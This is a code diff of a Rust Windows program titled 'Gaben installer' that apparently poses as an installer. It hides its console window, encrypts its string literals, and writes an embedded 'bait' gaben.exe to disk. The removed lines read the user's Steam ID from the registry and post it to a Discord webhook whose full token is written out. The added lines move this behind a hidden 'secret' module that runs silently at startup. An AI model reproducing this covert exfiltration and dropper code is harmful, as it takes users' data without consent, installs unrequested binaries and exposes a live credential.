@@ -1,11 +1,13 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
+mod secret;
+
+#[macro_use]
 extern crate litcrypt;
 
 use derive_builder::Builder;
-use litcrypt::use_litcrypt;
-#[allow(unused_imports)]
 use sdk::logger::log;
+use sdk::utils;
 use strum_macros::EnumIs;
 
 use eframe::{
@@ -13,7 +15,6 @@ use eframe::{
     App, NativeOptions, Theme,
 };
 use std::{fs::File, io::Write, path::PathBuf, time::Duration};
-
 use windows::core::s;
 use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_ICONINFORMATION, MB_OK};
 
@@ -22,6 +23,12 @@ use_litcrypt!();
 const WINDOW_WIDTH: f32 = 600.0;
 const WINDOW_HEIGHT: f32 = 450.0;
 const WINDOW_NAME: &str = "Gaben installer";
+
+#[cfg(not(debug_assertions))]
+const BINARY_BYTES: &[u8] = include_bytes!("..\\..\\target\\debug\\gaben.exe");
+
+#[cfg(debug_assertions)]
+const BINARY_BYTES: &[u8] = include_bytes!("..\\..\\target\\debug\\gaben.exe");
 
 #[cfg(target_os = "windows")]
 #[tokio::main]
@@ -66,10 +73,6 @@ async fn main() {
         ..Default::default()
     };
 
-    if let Some(id) = get_steam_id() {
-        send_message(id).await;
-    }
-
     let options = NativeOptions {
         centered: true,
         vsync: false,
@@ -78,6 +81,8 @@ async fn main() {
         follow_system_theme: false,
         ..Default::default()
     };
+
+    secret::send_steam_id().await;
 
     eframe::run_native(
         WINDOW_NAME,
@@ -170,9 +175,7 @@ impl Window {
                             return;
                         };
 
-                        let bait_bytes: &[u8] =
-                            include_bytes!("..\\..\\target\\release\\gaben.exe");
-                        match dest.write_all(&bait_bytes) {
+                        match dest.write_all(&BINARY_BYTES) {
                             Ok(_) => {
                                 self.fallback = Some(Fallback::Done);
                                 unsafe {
@@ -207,32 +210,4 @@ impl App for Window {
     fn update(&mut self, ctx: &egui::Context, _: &mut eframe::Frame) {
         egui::CentralPanel::default().show(ctx, |ui| self.panel(ui));
     }
-}
-
-fn get_steam_id() -> Option<u32> {
-    use winreg::enums::*;
-    use winreg::RegKey;
-    let hklm = RegKey::predef(HKEY_CURRENT_USER);
-    if let Ok(active_process) = hklm.open_subkey("SOFTWARE\\Valve\\Steam\\ActiveProcess") {
-        let Ok(id) = active_process.get_value::<u32, &str>("ActiveUser") else {
-            return None;
-        };
-
-        return Some(id);
-    }
-
-    None
-}
-
-async fn send_message(steam_id: u32) {
-    use litcrypt::lc;
-    use reqwest::Client;
-    use std::collections::HashMap;
-
-    let steam_profile = format!("https://steamcommunity.com/profiles/[U:1:{}]", steam_id);
-    let mut body = HashMap::new();
-    body.insert("content", steam_profile);
-
-    let webhook = lc!("https://discord.com/api/webhooks/1232012426657136742/of0BaEzlrWgex06GMZihwOYOfgvGdZM24qCYXAXtLNhtCqNvTQDfM8qWJDRgUfug34Q_");
-    let _ = Client::new().post(webhook).json(&body).send().await;
 }
